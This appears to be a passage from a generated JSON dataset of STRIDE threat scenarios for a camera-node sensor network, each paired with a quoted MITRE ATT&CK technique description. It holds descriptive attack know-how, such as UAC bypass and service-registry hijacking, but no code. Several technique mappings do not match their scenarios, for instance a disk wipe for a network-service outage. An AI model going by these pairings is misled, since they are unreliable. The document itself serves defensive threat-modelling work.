within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the VSN software, gaining access to stored visual data.",
            "Assumptions": [
                {
                    "Assumption": "Known vulnerabilities are present in the VSN software.",
                    "Role": "Software Developer",
                    "Condition": "If software updates and patches are not applied promptly."
                },
                {
                    "Assumption": "Insufficient security testing.",
                    "Role": "Quality Assurance",
                    "Condition": "If security flaws are not identified during development and testing."
                },
                {
                    "Assumption": "No real-time vulnerability scanning.",
                    "Role": "Security Analyst",
                    "Condition": "If the system doesn't have real-time tools to detect vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access to stored data leading to data leaks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerability",
                "software",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with traffic to overload the VSN, rendering camera nodes inoperative.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks adequate traffic filtering.",
                    "Role": "Network Engineer",
                    "Condition": "If proper network traffic filtering mechanisms are not in place."
                },
                {
                    "Assumption": "High vulnerability to volumetric attacks.",
                    "Role": "Security Analyst",
                    "Condition": "If the system cannot handle large volumes of traffic."
                },
                {
                    "Assumption": "No distributed denial-of-service (DDoS) protection.",
                    "Role": "IT Manager",
                    "Condition": "If there are no DDoS mitigation services."
                }
            ],
            "Potential Impact": "Reduced availability, disrupted functioning of visual data transmission.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "overload",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A software vulnerability is exploited to crash the firmware of camera nodes, causing the VSN to become non-functional.",
            "Assumptions": [
                {
                    "Assumption": "Known firmware vulnerabilities are unpatched.",
                    "Role": "Firmware Engineer",
                    "Condition": "If firmware patches are not applied in a timely manner."
                },
                {
                    "Assumption": "No redundancy or failover mechanism.",
                    "Role": "System Architect",
                    "Condition": "If there is no failover system to handle node outages."
                },
                {
                    "Assumption": "Nodes do not have automatic recovery mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "If nodes are not capable of self-recovery from crashes."
                }
            ],
            "Potential Impact": "Complete shutdown of visual data capture and processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "firmware",
                "crash",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses a malware attack to disable network services, halting visual data transmission across the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Lack of real-time malware detection and prevention.",
                    "Role": "Security Analyst",
                    "Condition": "If malware detection mechanisms are absent or outdated."
                },
                {
                    "Assumption": "Network security policies are not enforced rigorously.",
                    "Role": "Network Administrator",
                    "Condition": "If security policies are lax or not applied consistently."
                },
                {
                    "Assumption": "Insufficient network segmentation.",
                    "Role": "IT Infrastructure Manager",
                    "Condition": "If the network is not adequately segmented to contain attacks."
                }
            ],
            "Potential Impact": "Interruption of visual data transmission and potential loss of data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "network",
                "disable service"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative rights through a vulnerability in the VSN software, allowing full control over the network.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched software vulnerabilities exist.",
                    "Role": "Software Developer",
                    "Condition": "If security patches and updates are not applied timely."
                },
                {
                    "Assumption": "Potentially exploitable administrative access paths.",
                    "Role": "IT Manager",
                    "Condition": "If administrative access paths can be exploited without detection."
                },
                {
                    "Assumption": "Inadequate monitoring for privilege escalations.",
                    "Role": "Security Analyst",
                    "Condition": "If the system lacks effective monitoring for unusual access patterns."
                }
            ],
            "Potential Impact": "Complete system takeover and unauthorized access to all VSN data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative access",
                "control",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised device within the network is used to exploit a kernel vulnerability, gaining higher-level privileges.",
            "Assumptions": [
                {
                    "Assumption": "Kernel vulnerabilities are unpatched.",
                    "Role": "System Administrator",
                    "Condition": "If kernel patches are not applied regularly."
                },
                {
                    "Assumption": "Device-level security controls are lax.",
                    "Role": "IT Security",
                    "Condition": "If devices within the network don't have stringent security measures."
                },
                {
                    "Assumption": "Insufficient isolation of privilege levels.",
                    "Role": "Network Engineer",
                    "Condition": "If privilege levels are not adequately separated."
                }
            ],
            "Potential Impact": "Unauthorized changes to system configurations and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "kernel",
                "device",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a code injection vulnerability to execute arbitrary code with elevated privileges on VSN nodes.",
            "Assumptions": [
                {
                    "Assumption": "Code injection vulnerability present in the system.",
                    "Role": "Software Developer",
                    "Condition": "If input validation and sanitization are not properly implemented."
                },
                {
                    "Assumption": "Lack of privilege separation between different levels of users.",
                    "Role": "System Architect",
                    "Condition": "If privilege escalation paths are not properly controlled."
                },
                {
                    "Assumption": "No real-time threat detection mechanisms.",
                    "Role": "Security Analyst",
                    "Condition": "If the system lacks real-time monitoring for unusual code execution."
                }
            ],
            "Potential Impact": "Full control over affected nodes and unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "code injection",
                "arbitrary code",
                "system access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers can spoof the identity of video camera nodes to inject false visual data.",
            "Assumptions": [
                {
                    "Assumption": "Camera node identity verification is weak or absent.",
                    "Role": "Attacker",
                    "Condition": "If the attackers can exploit weaknesses in identity verification mechanisms."
                },
                {
                    "Assumption": "The network does not enforce mutual authentication.",
                    "Role": "Attacker",
                    "Condition": "If the network setup lacks mutual authentication protocols."
                },
                {
                    "Assumption": "Visual sensor network relies on input from camera nodes without validation",
                    "Role": "System",
                    "Condition": "If the network processes data from camera nodes without verifying origin."
                }
            ],
            "Potential Impact": "Unauthorized data could corrupt the overall system integrity and deceive users.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers can spoof administrative credentials to take control of the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Weak or reused passwords are used for administrative access.",
                    "Role": "Attacker",
                    "Condition": "If administrators use weak or reused passwords."
                },
                {
                    "Assumption": "Lack of multi-factor authentication.",
                    "Role": "System",
                    "Condition": "If the system does not enforce multi-factor authentication."
                },
                {
                    "Assumption": "The network can be accessed by unauthorized users.",
                    "Role": "Attacker",
                    "Condition": "If network access controls are insufficient."
                }
            ],
            "Potential Impact": "Attackers could gain unauthorized access and control over the system, compromising data integrity and system availability.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "spoofing",
                "account",
                "network"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers create fake camera nodes to intercept communications.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient measures for verifying camera node authenticity.",
                    "Role": "Attacker",
                    "Condition": "If the system does not have adequate node authenticity verification."
                },
                {
                    "Assumption": "No encryption is applied to communication channels.",
                    "Role": "System",
                    "Condition": "If communications are transmitted unencrypted."
                },
                {
                    "Assumption": "Attackers can physically place or simulate the presence of fake nodes.",
                    "Role": "Attacker",
                    "Condition": "If attackers have physical or simulated access near the network."
                }
            ],
            "Potential Impact": "This can lead to unauthorized data interception, violation of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "communication",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers tamper with the visual data being transmitted.",
            "Assumptions": [
                {
                    "Assumption": "No end-to-end encryption is used for data transmission.",
                    "Role": "System",
                    "Condition": "If data is transmitted in an unencrypted format."
                },
                {
                    "Assumption": "Attackers can gain access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "If the network lacks secure access controls."
                },
                {
                    "Assumption": "Lack of integrity checks on received data.",
                    "Role": "System",
                    "Condition": "If the system does not validate data integrity."
                }
            ],
            "Potential Impact": "Compromises data integrity, causing users to act on false information.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data",
                "integrity",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware introduced into camera nodes can alter visual data.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes have security vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "If vulnerabilities in camera nodes are not patched."
                },
                {
                    "Assumption": "Insufficient runtime checks and protections.",
                    "Role": "System",
                    "Condition": "If the system lacks runtime integrity protection."
                },
                {
                    "Assumption": "Remote code execution capability on IoT nodes.",
                    "Role": "Attacker",
                    "Condition": "If attackers can execute arbitrary code on camera nodes."
                }
            ],
            "Potential Impact": "Leads to data corruption and unauthorized visual data manipulation.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "tampering",
                "device",
                "execution"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampered firmware updates for camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "No validation of firmware integrity.",
                    "Role": "System",
                    "Condition": "If updates are applied without verification."
                },
                {
                    "Assumption": "Insecure firmware distribution methods.",
                    "Role": "System",
                    "Condition": "If firmware is distributed over insecure channels."
                },
                {
                    "Assumption": "Access control weaknesses allow tampering.",
                    "Role": "Attacker",
                    "Condition": "If access control mechanisms can be bypassed."
                }
            ],
            "Potential Impact": "Could compromise the entire network of camera nodes, leading to widespread data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "device",
                "network"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users or administrators deny making certain critical network configuration changes.",
            "Assumptions": [
                {
                    "Assumption": "Lack of logging/monitoring for configuration changes.",
                    "Role": "System",
                    "Condition": "If the system does not log changes accurately."
                },
                {
                    "Assumption": "No non-repudiation mechanisms (e.g., digital signatures).",
                    "Role": "System",
                    "Condition": "If actions are not digitally signed."
                },
                {
                    "Assumption": "Weak administrative controls.",
                    "Role": "System",
                    "Condition": "If administrative areas are insufficiently restricted or controlled."
                }
            ],
            "Potential Impact": "Potential issues in tracking accountability, resulting in compromised integrity and enabling further malicious actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "configuration",
                "control"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Activity logs manipulated to hide interactions of unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient log integrity protection mechanisms.",
                    "Role": "System",
                    "Condition": "If logs can be manipulated without detection."
                },
                {
                    "Assumption": "Attackers gain sufficient privileges to alter logs.",
                    "Role": "Attacker",
                    "Condition": "If attackers escalate privileges to access logs."
                },
                {
                    "Assumption": "Logs are not regularly validated or backed up.",
                    "Role": "System",
                    "Condition": "If regular validation and secure backups of logs are not performed."
                }
            ],
            "Potential Impact": "Maintains unauthorized access and activities hidden, impacting system auditability and accountability.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "privilege escalation",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry 